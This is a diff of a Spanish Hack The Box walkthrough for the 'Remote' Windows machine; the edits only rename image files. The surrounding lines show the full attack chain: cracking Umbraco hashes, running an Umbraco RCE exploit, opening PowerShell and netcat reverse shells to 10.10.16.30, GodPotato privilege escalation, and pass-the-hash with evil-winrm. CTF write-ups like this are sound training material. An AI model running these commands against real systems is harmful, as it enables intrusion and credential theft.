@@ -3,7 +3,7 @@ title: "Remote - WriteUp"
 date: Wed Jul 24 2024 18:00:00 GMT+0200 (Central European Summer Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, sudo, smb, exploit, winrm, ftp, windows, evil-winrm]
-image: /assets/img/htb-writeups/Pasted image 20231203185311.png
+image: /assets/img/htb-writeups/Pasted-image-20231203185311.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231203185311.png
   platform="HTB"
 %}
 
-![Remote](/assets/img/htb-writeups/Pasted image 20231203185311.png)
+![Remote](/assets/img/htb-writeups/Pasted-image-20231203185311.png)
 
 -----
 
@@ -87,13 +87,13 @@ Host script results:
 
 HTTP 80
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203185311.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203185311.png)
 
 ```http
 http://10.129.229.68/umbraco/
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203201236.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203201236.png)
 
 111 RPC
 
@@ -113,7 +113,7 @@ Vamos a usar _rpcinfo_ para enumerar servicios.
 $ rpcinfo 10.129.229.68
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203194007.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203194007.png)
 
 Tenemos el servicio _nfs_ con el que podríamos subir o descargar archivos. O también probar de montarlos. 
 
@@ -133,13 +133,13 @@ $ sudo mount -t nfs 10.129.229.68:/site_backups /mnt/remote -o nolock
 
 Ahora nos vamos a la carpeta que acabamos de montar con permisos de solo lectura y exploraremos todo con detenimiento.
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203195344.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203195344.png)
 
 El dominio de correo es @htb.local
 
 Descubro el archivo "Umbraco.sdf" con jugoso contenido en su interior.
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203212504.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203212504.png)
 
 ```rb
 Administratoradmindefaulten-US
@@ -154,7 +154,7 @@ ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaB
 
 Ahora toca descubrir si son hashes de verdad e identificarlos para intentar crackearlos.
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203212911.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203212911.png)
 
 Copiamos este hash en un archivo que he llamado "hash.SHA1" y lo intentamos descifrar con nuestro amigo del alma _john_:
 
@@ -162,7 +162,7 @@ Copiamos este hash en un archivo que he llamado "hash.SHA1" y lo intentamos desc
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash.SHA1
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203213642.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203213642.png)
 
 Y parece que tenemos ganador!
 
@@ -174,19 +174,19 @@ admin@htb.local:baconandcheese     ||    UMBRACO Login
 
 Vamos a probar las credenciales en el CMS de Umbraco:
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203215008.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215008.png)
 
 Y entramos!
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203215217.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215217.png)
 
 Vamos a buscar la versión exacta de Umbraco para ver los exploits que hay.
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203215441.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215441.png)
 
 Umbraco version 7.12.4 
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231203215632.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231203215632.png)
 
 Encontramos 2 con versión exacta y para Windows. Perfecto.
 
@@ -196,7 +196,7 @@ Nos copiamos el segundo exploit, el 49488 y lo ejecutamos con un comando sencill
 $ python3 49488.py -u admin@htb.local -p baconandcheese -i 'http://10.129.229.68' -c whoami -a /priv
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204090523.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204090523.png)
 
 Y vemos que sí. Tenemos ejecución remota de comandos y encima ya vemos un privilegio explotable.
 
@@ -212,7 +212,7 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.30 -Port 4444
 
 Editamos el archivo .py del exploit dejándolo así:
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204093717.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204093717.png)
 
 Estas son las líneas en texto editable.
 
@@ -244,7 +244,7 @@ Start
 []
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204094807.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204094807.png)
 
 Dentro!
 
@@ -327,7 +327,7 @@ En la máquina víctima ejecutamos el exploit.
 PS C:\Users\public\tmp> .\godpotato.exe -cmd ".\nc.exe -t -e C:\windows\system32\cmd.exe 10.10.16.30 443"
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204102850.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204102850.png)
 
 Éxito. Registramos la bandera que nos queda sita en la carpeta del usuario Administrator y podemos dar por finalizada la máquina.
 
@@ -354,7 +354,7 @@ Hash NTLM: 86fc053bc0b23588798277b22540c40c
 $ evil-winrm -i 10.129.229.68 -u 'Administrator' -H '86fc053bc0b23588798277b22540c40c'
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204110453.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204110453.png)
 
 --------
 
@@ -373,7 +373,7 @@ En la máquina remota ejecutamos:
 > Get-TeamViewPasswords
 ```
 
-![REMOTE](/assets/img/htb-writeups/Pasted image 20231204115353.png)
+![REMOTE](/assets/img/htb-writeups/Pasted-image-20231204115353.png)
 
 Y nos encontrará el password del usuario Administrador en texto plano.
 
